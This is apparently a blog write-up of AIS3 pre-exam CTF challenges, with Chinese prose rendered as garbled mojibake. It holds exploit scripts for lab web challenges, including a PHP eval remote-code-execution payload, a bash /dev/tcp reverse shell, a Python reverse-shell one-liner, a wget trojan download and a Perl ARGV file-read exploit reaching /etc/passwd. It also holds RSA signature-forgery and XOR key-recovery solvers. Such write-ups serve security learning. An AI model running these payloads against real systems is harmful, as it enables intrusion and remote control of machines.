    <span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>&lt;&lt;prefix_bits):
        x = n | prefix&lt;&lt;(idx-prefix_bits+<span class="hljs-number">1</span>)
        print(idx, prefix_bits)
        y = x | <span class="hljs-number">1</span>&lt;&lt;(idx-prefix_bits)
        <span class="hljs-keyword">if</span> isSmall(x) != isSmall(y): <span class="hljs-comment"># TADA !</span>
            <span class="hljs-keyword">return</span> (x, y), idx - prefix_bits - <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> guess(n, idx, prefix_bits+<span class="hljs-number">1</span>)

s = remote(<span class="hljs-string">'104.199.235.135'</span>, <span class="hljs-number">20004</span>)
pow_str = s.recvuntil(<span class="hljs-string">'x = '</span>).decode()
x_prefix = pow_str.split(<span class="hljs-string">"'"</span>)[<span class="hljs-number">1</span>]
ans = PoW(x_prefix)
s.sendline(ans)

s.recvuntil(<span class="hljs-string">'\n'</span>)
idx = <span class="hljs-number">8</span>*<span class="hljs-number">16</span><span class="hljs-number">-2</span>
n0, n1 = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">127</span>
<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    res = guess(n0, idx)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res:
        res = guess(n1, idx)
    <span class="hljs-keyword">assert</span> res <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>
    (n0, n1), idx = res
    p(n0)
    p(n1)</code></pre><p>Flag: <code>AIS3{ag3NTs Of S.H.I.E.L.D. - I 10V3 d4Isy J0HNs0n}</code></p>
<p>é€™é¡Œæ²’æœ‰åˆ°å¤ªé›£ï¼Œä½†å‰å…©å¤©éƒ½æ²’äººè§£ï¼Œè²Œä¼¼æ˜¯å› ç‚º timeout ï¼ŒåŸæœ¬å¥½åƒåªæœ‰ 150 ç§’çš„é™åˆ¶ï¼Œå¾Œä¾†èª¿åˆ° 300 ç§’å†èª¿åˆ° 600 ç§’çš„æ¨£å­(å«PoW)ã€‚</p>
<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
<h3 id="web-1"><a class="header-link" href="#web-1"></a>Web 1</h3>
<p>å¦‚é¡Œç›®æ•˜è¿°ï¼ŒHTTP response header å°±æœ‰éƒ¨ä»½ flagï¼Œå¯«å€‹ script æŠ“ä¸€ä¸‹å°±å¥½ã€‚</p>
<h3 id="web-2"><a class="header-link" href="#web-2"></a>Web 2</h3>
<p>æ²’è¨˜éŒ¯çš„è©±æ‡‰è©²æ˜¯æƒ robots.txt ä¹‹é¡çš„æ‰¾åˆ° <code>_hidden_flag_.php</code>ï¼Œé€™å€‹é é¢æœƒç”¨ js è®“ä½ ç­‰åå¹¾ç§’ï¼Œæ™‚é–“åˆ°äº†æœƒæœ‰æŒ‰éˆ•è·‘å‡ºä¾†é€²å…¥ä¸‹ä¸€å€‹é é¢ï¼Œé€™å€‹ js è¢«æ··æ·†éäº†ï¼š</p>
<pre class="hljs"><code><span class="hljs-keyword">var</span> _0x13ed=[<span class="hljs-string">'getElementById'</span>,<span class="hljs-string">'disp'</span>,<span class="hljs-string">'setInterval'</span>,<span class="hljs-string">'onload'</span>,<span class="hljs-string">'clearInterval'</span>,<span class="hljs-string">'innerHTML'</span>,<span class="hljs-string">'&lt;input\x20type=\x22submit\x22\x20value=\x22Get\x20flag\x20in\x20the\x20next\x20page.\x22/&gt;'</span>];(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4ff87b,_0x35e2bc</span>)</span>{<span class="hljs-keyword">var</span> _0x2c01be=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">_0x216360</span>)</span>{<span class="hljs-keyword">while</span>(--_0x216360){_0x4ff87b[<span class="hljs-string">'push'</span>](_0x4ff87b[<span class="hljs-string">'shift'</span>]());}};_0x2c01be(++_0x35e2bc);}(_0x13ed,<span class="hljs-number">0x13f</span>));<span class="hljs-keyword">var</span> _0x5d44=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">_0x592680,_0x1e9b97</span>)</span>{_0x592680=_0x592680<span class="hljs-number">-0x0</span>;<span class="hljs-keyword">var</span> _0x50206c=_0x13ed[_0x592680];<span class="hljs-keyword">return</span> _0x50206c;};<span class="hljs-keyword">var</span> left=<span class="hljs-number">0x0</span>;<span class="hljs-keyword">var</span> timer=<span class="hljs-literal">null</span>;<span class="hljs-keyword">var</span> disp=<span class="hljs-literal">null</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">countdown</span>(<span class="hljs-params"></span>)</span>{left=left<span class="hljs-number">-0x1</span>;<span class="hljs-keyword">if</span>(timer!=<span class="hljs-literal">null</span>&amp;&amp;left==<span class="hljs-number">0x0</span>){<span class="hljs-built_in">window</span>[_0x5d44(<span class="hljs-string">'0x0'</span>)](timer);timer=<span class="hljs-literal">null</span>;disp[_0x5d44(<span class="hljs-string">'0x1'</span>)]=_0x5d44(<span class="hljs-string">'0x2'</span>);}<span class="hljs-keyword">else</span>{disp[_0x5d44(<span class="hljs-string">'0x1'</span>)]=<span class="hljs-string">'('</span>+left+<span class="hljs-string">')'</span>;}}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setup</span>(<span class="hljs-params"></span>)</span>{disp=<span class="hljs-built_in">document</span>[_0x5d44(<span class="hljs-string">'0x3'</span>)](_0x5d44(<span class="hljs-string">'0x4'</span>));left=<span class="hljs-number">0xa</span>+<span class="hljs-built_in">parseInt</span>(<span class="hljs-built_in">Math</span>[<span class="hljs-string">'random'</span>]()*<span class="hljs-number">0xa</span>);timer=<span class="hljs-built_in">window</span>[_0x5d44(<span class="hljs-string">'0x5'</span>)](countdown,<span class="hljs-number">0x3e8</span>);disp[_0x5d44(<span class="hljs-string">'0x1'</span>)]=<span class="hljs-string">'('</span>+left+<span class="hljs-string">')'</span>;}<span class="hljs-built_in">window</span>[_0x5d44(<span class="hljs-string">'0x6'</span>)]=setup;</code></pre><p>äº‹å¯¦ä¸Šæ ¹æœ¬æ²’å¿…è¦çœ‹ï¼Œä½†æˆ‘é‚„æ˜¯åˆ†æäº†ä¸€ä¸‹ï¼Œå°±åªæ˜¯ Math.random éš¨æ©Ÿç§’æ•¸ä¹‹å¾Œç”¢ç”Ÿ buttonï¼Œæ‹¿é é¢ä¸Šçš„åƒæ•¸é€ post å»ä¸‹ä¸€é—œã€‚</p>
<p>å†åº¦è§€å¯Ÿ header (thanks to @sces60107 çš„æé†’)ï¼Œheader æœƒå‘ŠçŸ¥ä½ æœ‰æ²’æœ‰æ‹¿åˆ°æ­£ç¢ºçš„ flagï¼Œæ‰€ä»¥å¯« script ä¸€ç›´é€ requestï¼Œå¾€ä¸‹ä¸€é—œèµ°ï¼Œåˆ¤æ–· header æœ‰æ²’æœ‰ flag å°±å¥½ï¼Œç¸½å…±é€å€‹ä¸€å…©è¬ç­† request å°±èƒ½æ‹¿åˆ° flagã€‚</p>
<h3 id="web-3"><a class="header-link" href="#web-3"></a>Web 3</h3>
<p>é¡Œç›® code æˆ‘æ²’å­˜ï¼Œä½†å¤§è‡´ä¸Šæ˜¯é€™æ¨£:</p>
<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
highlight_file(<span class="hljs-keyword">__file__</span>);
$_ = $_GET[<span class="hljs-string">'ğŸ£'</span>];
<span class="hljs-keyword">if</span> (stripos($_, <span class="hljs-string">'"'</span>) !== <span class="hljs-keyword">false</span> || stripos($_, <span class="hljs-string">"'"</span>) !== <span class="hljs-keyword">false</span>)
  <span class="hljs-keyword">die</span>(<span class="hljs-string">'GG'</span>);
<span class="hljs-keyword">eval</span>(<span class="hljs-string">'die("'</span>.substr($_, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>).<span class="hljs-string">'");'</span>);</code></pre><p>16 å€‹ byte æ”¾åˆ° <code>die(&quot; [PAYLOAD] &quot;);</code> ä¸­å» evalï¼Œå…¶ä¸­ payload ä¸èƒ½åŒ…å«å–®é›™å¼•è™Ÿã€‚</p>
<p>ç¨å¾®æŸ¥ä¸€ä¸‹ php çš„ç‰¹æ€§ï¼Œæœƒç™¼ç¾ <a href="http://php.net/manual/en/language.types.string.php#language.types.string.parsing">php double-quote string å¯ä»¥æ”¾ dollar <code>$</code></a> ï¼Œå¯ä»¥ç”¨ä¾† expand variablesï¼Œé€²ä¸€æ­¥æ¸¬è©¦ç™¼ç¾é‚„å¯ä»¥åš function callï¼Œåƒè€ƒ<a href="http://php.net/manual/en/language.types.string.php#language.types.string.parsing">é€™è£¡</a> çš„ &quot;Complex (curly) syntax&quot;ã€‚</p>
<p>ç„¶å¾Œ php <a href="http://php.net/manual/en/language.operators.execution.php">backtick</a> å¯ä»¥ç”¨ä¾† call shellï¼Œé‚£ç›®æ¨™æ˜ç¢ºï¼šçµåˆå…©è€…ç›´æ¥æ‹¿ shellã€‚</p>
<p>å…ˆä¾†å€‹æ¸¬è©¦çš„ payloadï¼Œä¸€èˆ¬åš proof of concept çš„æ¸¬è©¦æˆ‘éƒ½æ˜¯ç”¨ <code>sleep 3</code>, <code>sh</code>, <code>cat /dev/urandom</code>, <code>yes</code>  ä¹‹é¡ä¾†çœ‹æœƒä¸æœƒ hang ä½ï¼Œé€²è€Œæ¸¬è©¦ RCE å¯èƒ½æ€§ã€‚</p>
<pre class="hljs"><code>ğŸ£=${`sleep <span class="hljs-number">5</span>`}</code></pre><p>æœç„¶çœŸçš„ç¡äº†äº”ç§’æ‰å›ï¼Œé‚£å¯ä»¥ RCE äº†ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥æ‹¿ flagï¼Œä½†èƒ½ä¸èƒ½æ‹¿åˆ° reverse shell å‘¢ï¼Ÿ</p>
<p>é•·åº¦é™åˆ¶åªæœ‰ 16 bytesï¼Œreverse shell çš„ payload è½è½é•·å¾ˆé›£åœ¨ 16 bytes å…§ï¼Œé‚£è©²æ€éº¼æ‹‰é•·è‡ªå·±çš„ payload ï¼Ÿåªå¥½å†ä¾é  php å¹«æˆ‘å€‘ä¸€æŠŠï¼Œæˆ‘å€‘æŠŠ payload ç”¨ get å‚³ï¼Œå†é  PHP interpret è®Šæ•¸ä¸¦ RCE:</p>
<pre class="hljs"><code>ğŸ£=${`$_GET[<span class="hljs-number">1</span>]`}&amp;<span class="hljs-number">1</span>=RCE_PAYLOAD</code></pre><p>Python script:</p>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-keyword">import</span> requests
payload = <span class="hljs-string">'bash -i &gt;&amp; /dev/tcp/240.1.23/12345 0&gt;&amp;1 2&gt;&amp;1'</span>
r = requests.get(<span class="hljs-string">'http://104.199.235.135:31333/'</span>, params={<span class="hljs-string">'ğŸ£'</span>:<span class="hljs-string">'${`$_GET[1]`}'</span>, <span class="hljs-string">'1'</span>: payload})
print(r.text)</code></pre><h3 id="web-4"><a class="header-link" href="#web-4"></a>Web 4</h3>
<p>å…ˆç”¨ <a href="https://github.com/YSc21/webcocktail">scanner</a> æƒåˆ° <code>.git</code> å¾Œç”¨ <a href="https://github.com/internetwache/GitTools">gitdumper</a> æ‹¿ä¸‹ä¾†ï¼Œå¯ä»¥çœ‹åˆ° perl çš„ source code:</p>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/perl</span>
<span class="hljs-comment"># My uploader!</span>
<span class="hljs-keyword">use</span> strict;
<span class="hljs-keyword">use</span> warnings;
<span class="hljs-keyword">use</span> CGI;
<span class="hljs-keyword">my</span> $cgi = CGI-&gt;new;
<span class="hljs-keyword">print</span> $cgi-&gt;header();
<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;body style=\"background: #caccf7 url('https://i.imgur.com/Syv2IVk.png');padding: 30px;\"&gt;"</span>;
<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;p style='color:red'&gt;No BUG Q_____Q&lt;/p&gt;"</span>;
<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;br&gt;"</span>;
<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;pre&gt;"</span>;
<span class="hljs-keyword">if</span>( $cgi-&gt;upload(<span class="hljs-string">'file'</span>) ) {
        <span class="hljs-keyword">my</span> $file = $cgi-&gt;param(<span class="hljs-string">'file'</span>);
        <span class="hljs-keyword">while</span>(&lt;$file&gt;) {
                <span class="hljs-keyword">print</span> <span class="hljs-string">"$_"</span>;
        }
}
<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;/pre&gt;"</span>;</code></pre><p>çœ‹äº†æˆ‘ä¹Ÿä¸çŸ¥é“è¦å¹¹éº»ï¼Œé‚£å°± Google ä¸€ä¸‹å§ï¼Œç¿»äº†ä¸€ä¸‹ç™¼ç¾é€™é¡Œä¹‹å‰å·²ç¶“å‡ºéä¸€æ¨¡ä¸€æ¨£çš„ï¼š</p>
<ul class="list">
<li><a href="https://dciets.com/writeups/2016/09/18/csaw-quals-ctf-2016-i-got-id/">https://dciets.com/writeups/2016/09/18/csaw-quals-ctf-2016-i-got-id/</a></li>
<li><a href="https://tsublogs.wordpress.com/2016/09/18/606/">https://tsublogs.wordpress.com/2016/09/18/606/</a></li>
<li><a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf">https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf</a></li>
</ul>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># Python 3.6.5</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re

s = requests.session()

<span class="hljs-string">'''
1. To send multiple files, we have tp use list here
2. Each element is a tuple, (POST name, (filename, file content))
3. The filename of ARGV must be empty
'''</span>

files = [(<span class="hljs-string">'file'</span>, (<span class="hljs-string">''</span>, <span class="hljs-string">'ARGV'</span>)), (<span class="hljs-string">'file'</span>, (<span class="hljs-string">'filename1'</span>, <span class="hljs-string">'content1'</span>))]
<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    rce = <span class="hljs-string">'sh -c /readflag|xxd|'</span>
    r = s.post(<span class="hljs-string">'http://104.199.235.135:31334/cgi-bin/index.cgi?'</span> + lfi_filepath, files=files)
    <span class="hljs-comment">#print(r.text)</span>
    print(re.findall(<span class="hljs-string">r'&lt;pre&gt;(.*)&lt;/pre&gt;'</span>, r.text, re.S)[<span class="hljs-number">0</span>])

<span class="hljs-string">'''
Raw payload:

POST /cgi-bin/index.cgi?/etc/passwd HTTP/1.1
Host: 104.199.235.135:31334
User-Agent: python-requests/2.18.4
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 255
Content-Type: multipart/form-data; boundary=83b02634dc0d43e7992884eb46e3aed5

--83b02634dc0d43e7992884eb46e3aed5
Content-Disposition: form-data; name="file"; filename=""

ARGV
--83b02634dc0d43e7992884eb46e3aed5
Content-Disposition: form-data; name="file"; filename="filename1"

content1
--83b02634dc0d43e7992884eb46e3aed5--
'''</span></code></pre><p>å¯ä»¥ RCE åŸºæœ¬ä¸Šå¯ä»¥æ‹¿ flagï¼Œä½†èƒ½ä¸èƒ½å½ˆ reverse shell å‘¢ï¼Ÿå˜—è©¦åŸ·è¡Œ reverse shell payload å»ç™¼ç¾ bash é¦¬ä¸Šé—œæ‰ï¼Œé‚£åªå¥½ç”¨åœŸä¸€é»çš„æ–¹æ³•ï¼Œå…ˆ wget ä¸‹è¼‰æœ¨é¦¬ï¼Œå†åŸ·è¡Œ reverse shellï¼Œé€™æ¬¡æ˜¯ python 2.7 çš„ <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell</a></p>
<pre class="hljs"><code>python -c <span class="hljs-string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("240.1.2.3",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></code></pre><pre class="hljs"><code><span class="hljs-attribute">wget</span> <span class="hljs-number">240.1.2.3:1234</span> -O /tmp/abcd</code></pre><p>å‡ºå®Œå…¨ä¸€æ¨£çš„é¡Œç›®å¥½åƒä¸å¤ªå¥½(?)</p>
<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
<h3 id="crypto-1"><a class="header-link" href="#crypto-1"></a>Crypto 1</h3>
<p>å¿˜äº†ï¼Œè²Œä¼¼æ˜¯ç®—å®Œ PoW å°±æ‹¿åˆ° flag</p>
<h3 id="crypto-2"><a class="header-link" href="#crypto-2"></a>Crypto 2</h3>
<p>XOR é¡Œï¼š</p>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3                                                                                                                   </span>
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> random

<span class="hljs-keyword">with</span> open(<span class="hljs-string">'flag'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> data:
    flag = data.read()
    <span class="hljs-keyword">assert</span>(flag.startswith(<span class="hljs-string">b'AIS3{'</span>))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extend</span><span class="hljs-params">(key, L)</span>:</span> 
    kL = len(key)
    <span class="hljs-keyword">return</span> key * (L // kL) + key[:L % kL] 

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span><span class="hljs-params">(X, Y)</span>:</span> 
    <span class="hljs-keyword">return</span> bytes([x ^ y <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> zip(X, Y)])

key = os.urandom(random.randint(<span class="hljs-number">8</span>, <span class="hljs-number">12</span>))
plain = flag + key 
key = extend(key, len(plain))
cipher = xor(plain, key)

<span class="hljs-keyword">with</span> open(<span class="hljs-string">'flag-encrypted'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> data:
    data.write(cipher)</code></pre><p>å› ç‚ºä»–æœ€å¾ŒæœƒæŠŠ key åŠ åˆ° plain text ä¸Šï¼Œåˆ©ç”¨é€™å€‹ç‰¹æ€§å¯ä»¥è—‰ç”± flag é–‹é ­æ˜¯ <code>AIS3{</code>æ¨å°å‡ºå‰©ä¸‹çš„ bytesï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯æŠŠ flag rotate äº† k å€‹ bytesï¼Œå†è·Ÿ flag æœ¬èº« xorï¼š</p>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># Python 3.6.5</span>

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor

<span class="hljs-keyword">with</span> open(<span class="hljs-string">'flag.enc'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
    c = f.read()


<span class="hljs-keyword">for</span> key_len <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>, <span class="hljs-number">13</span>):
    parts = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(c)//key_len + <span class="hljs-number">1</span>):
        parts.append(c[i*key_len: (i+<span class="hljs-number">1</span>)*key_len])
        print(parts[<span class="hljs-number">-1</span>].hex())
    <span class="hljs-comment">#x ^ y = z</span>
    x = [xor(i, j) <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> zip(<span class="hljs-string">b'AIS3{'</span>, c)] + [<span class="hljs-keyword">None</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(key_len - len(<span class="hljs-string">'AIS3{'</span>))]
    right_rotate = len(parts[<span class="hljs-number">-1</span>])
    y = x[-right_rotate:] + x[:-right_rotate]

    z = c[-key_len:]
    z = z[-right_rotate:] + z[:-right_rotate]
    z = [bytes([i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> z]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(key_len):
        <span class="hljs-keyword">if</span> y[i] <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span> <span class="hljs-keyword">and</span> x[i] <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
            y[i] = xor(z[i], x[i])
            <span class="hljs-keyword">if</span> x[i-right_rotate] <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:
                x[i-right_rotate] = y[i]
        <span class="hljs-keyword">if</span> x[i] <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span> <span class="hljs-keyword">and</span> y[i] <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
            x[i] = xor(z[i], y[i])
            <span class="hljs-keyword">if</span> y[(i+right_rotate)%key_len] <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:
                y[(i+right_rotate)%key_len] = x[i]

    print(xor(<span class="hljs-string">b''</span>.join(x), c))</code></pre><h3 id="crypto-3-(unsolved,-thanks-to-@how2hack)"><a class="header-link" href="#crypto-3-(unsolved,-thanks-to-@how2hack)"></a>Crypto 3 (unsolved, thanks to @how2hack)</h3>
<p>Server code:</p>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes

<span class="hljs-comment">#from proof import proof</span>

<span class="hljs-comment"># some encoding problem in docker ( not important )</span>
<span class="hljs-keyword">import</span> io
<span class="hljs-keyword">import</span> sys
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding=<span class="hljs-string">'utf-8'</span>)

<span class="hljs-comment">#with open('flag') as data:</span>
<span class="hljs-comment">#    flag = data.read()</span>

normal = <span class="hljs-string">'\033[0m'</span>
bold = <span class="hljs-string">'\033[1m'</span>
red = <span class="hljs-string">'\033[91m'</span>
green = <span class="hljs-string">'\033[92m'</span>
yellow = <span class="hljs-string">'\033[93m'</span>
blue = <span class="hljs-string">'\033[94m'</span>
purple = <span class="hljs-string">'\033[95m'</span>
aquamarine = <span class="hljs-string">'\033[96m'</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cprint</span><span class="hljs-params">(text, color = normal)</span>:</span>
    <span class="hljs-keyword">if</span> color == normal:
        print(text)
    <span class="hljs-keyword">else</span>:
        print(<span class="hljs-string">'{}{}{}'</span>.format(color, text, normal))

<span class="hljs-comment">#proof()</span>

m = <span class="hljs-string">"""
I owe you 10 bucks
- 2018/4/1 Alice
"""</span>.strip()
key = RSA.generate(<span class="hljs-number">2048</span>, os.urandom)
m = int.from_bytes(m.encode(<span class="hljs-string">'utf-8'</span>), <span class="hljs-string">'big'</span>)
s = key.sign(m, <span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]

cprint(<span class="hljs-string">'â—¢'</span> + <span class="hljs-string">'â– '</span> * <span class="hljs-number">50</span> + <span class="hljs-string">'â—£'</span>, bold)
cprint(<span class="hljs-string">"- 2018/4/1"</span>, green)
cprint(<span class="hljs-string">"Alice : Here is the receipt for the loan."</span>, yellow)
cprint(<span class="hljs-string">"m = {}"</span>.format(m))
cprint(<span class="hljs-string">"Alice : Here is the digital signature (s, n, e) to prove that I actually wrote that receipt."</span>, yellow)
cprint(<span class="hljs-string">"s = {}"</span>.format(s))
cprint(<span class="hljs-string">"n = {}"</span>.format(key.n))
cprint(<span class="hljs-string">"e = {}"</span>.format(key.e))
cprint(<span class="hljs-string">"Bob : OK, remember to pay me back someday."</span>, aquamarine)
cprint(<span class="hljs-string">'â—¥'</span> + <span class="hljs-string">'â– '</span> * <span class="hljs-number">50</span> + <span class="hljs-string">'â—¤'</span>, bold)

cprint(<span class="hljs-string">''</span>)
cprint(<span class="hljs-string">"ğŸš€  on millions years later.."</span>, red)
cprint(<span class="hljs-string">''</span>)

cprint(<span class="hljs-string">'â—¢'</span> + <span class="hljs-string">'â– '</span> * <span class="hljs-number">50</span> + <span class="hljs-string">'â—£'</span>, bold)
cprint(<span class="hljs-string">"- 1002018/4/1"</span>, green)
cprint(<span class="hljs-string">"Bob : Dormammu, I've come to bargain."</span>, aquamarine)
cprint(<span class="hljs-string">"Alice : Uh..., I'm not Dormammu."</span>, yellow)
cprint(<span class="hljs-string">"Bob: Whatever..., I think it's time for you to pay me back."</span>, aquamarine)
cprint(<span class="hljs-string">"Bob : Here is the receipt for the loan and also the signature."</span>, aquamarine)

<span class="hljs-keyword">try</span>:
    m = int(input(<span class="hljs-string">"m = "</span>))
    s = int(input(<span class="hljs-string">"s = "</span>))
    <span class="hljs-keyword">if</span> key.verify(m, (s,)):
        m = long_to_bytes(m)
        print(m)
        print(m.split())
        print(m.split()[<span class="hljs-number">3</span>])
        bucks = int(m.split()[<span class="hljs-number">3</span>])
        print(bucks)
        <span class="hljs-keyword">if</span> bucks &gt; <span class="hljs-number">10</span>:
            cprint(<span class="hljs-string">"Alice : Oh crap, I don't have enough money..., maybe this flag can compensate you : {}"</span>.format(flag), yellow)
        <span class="hljs-keyword">else</span>:
            cprint(<span class="hljs-string">"Alice : Come on man, it's just 10 bucks..."</span>, yellow)
        exit(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">else</span>:
        cprint(<span class="hljs-string">"Alice : What have you done..."</span>, yellow)
<span class="hljs-keyword">except</span>:
    exit(<span class="hljs-number">0</span>)

...</code></pre><p>åŸºæœ¬ä¸Šæ˜¯è¦å½é€ ç°½åï¼Œæˆ‘ä¸€é–‹å§‹å˜—è©¦ç›´æ¥çˆ†ç ´ sï¼Œå˜—è©¦å¯èƒ½çš„ s ä½¿å¾— $s^e = m$ï¼Œä¸¦ä¸” m æœƒè®“ <code>int(m.split()[3]) &gt; 10</code>ï¼Œä¸é s è·‘äº†å¹¾åƒè¬éƒ½æ˜¯å¤±æ•—ï¼Œå› ç‚ºå¤ªé›£è®“ m å‡ºç¾ä¸‰å€‹ 0x20 (ç©ºæ ¼) äº†ã€‚</p>
<p>æ—¢ç„¶å–®ç´”çˆ†ç ´ s ä¸å¤ªå¯è¡Œï¼Œé‚£å°±æŠŠåŸæœ¬åˆæ³•çš„ m ä¹˜ä¸Šå»å§ï¼Œç•¢ç«ŸåŸæœ¬åˆæ³•çš„ m æœ‰ä¸å°‘çš„ 0x20ï¼Œé€™å€‹å¥½æ€§è³ªä½¿å¾—ä¹˜ä¸Š m ä¹‹å¾Œï¼Œå¾ˆå¿«å°±å¯ä»¥æœå‡ºåˆæ³•çš„è§£ï¼š </p>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># Python 3.6.5</span>

<span class="hljs-comment"># Solution thanks to @how2hack</span>
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes

m = <span class="hljs-number">554925652019585156475787890525225102046075682323304548835475744305803283492262994789</span>
s = <span class="hljs-number">8893931972182818044887642802041512151637835508778733483367383922956088851535543045353394423623009836954355437544623799405164469870666785493058916365730516406144818232329263261760598226562026674786971455782715020921619619272079877118489050655967728826115222391008470575222102106503254745378891954974052584021934609709120680006462744982083961724037574311385291857678940299733481927081819784710368972540801034570491587923992073030931037900174432334370101464769099165656306608605116392023443785561469993626851198599801789525811680963922516035028163499926100820053526995911509771419784466544291151531282528959015443443997</span>
n = <span class="hljs-number">21232057752203050626327375413774655245866966677562081461618777215050100809614174448121718664073874770580592047257544090518156549247464236449881573516955891064948348640120104781529771203540220265613570642486380465030497213834318682366615946716455109515130588928786185167829699861919862539288169713824716271127284133643717019874393701490287994956317815564214797946176560219681181431433749699809927415253346547229042693265155026780261727400030789693357428715693850685842499335548901588448935551794449164274161376491308273104734354438424848886632452109979780615769063146540382650313788634482118159125354009606248992156239</span>
e = <span class="hljs-number">65537</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>**<span class="hljs-number">30</span>):
    t = pow(i, e, n) * m % n 
    t=  long_to_bytes(t)
    <span class="hljs-comment">#print(m.split())</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> len(t.split()) &gt;= <span class="hljs-number">4</span> <span class="hljs-keyword">and</span> int(t.split()[<span class="hljs-number">3</span>]) &gt; <span class="hljs-number">10</span>: 
            print(t)
    <span class="hljs-keyword">except</span> ValueError:
        <span class="hljs-keyword">pass</span></code></pre><h3 id="crypto-4"><a class="header-link" href="#crypto-4"></a>Crypto 4</h3>
<p>Server code:</p>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-keyword">import</span> os, sys
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">from</span> urllib.error <span class="hljs-keyword">import</span> HTTPError, URLError
<span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode, b64decode
<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
<span class="hljs-keyword">from</span> proof <span class="hljs-keyword">import</span> proof

<span class="hljs-keyword">with</span> open(<span class="hljs-string">'flag'</span>) <span class="hljs-keyword">as</span> data:
    flag = data.read()
<span class="hljs-comment"># simplify mail format</span>
mail_for_ctfplayer = <span class="hljs-string">'''
From: thor@ais3.org
To: ctfplayer@ais3.org

--BOUNDARY
Type: text
Welcome to AIS3 pre-exam.

--BOUNDARY
Type: cmd
echo 'This is the blog of oalieno'
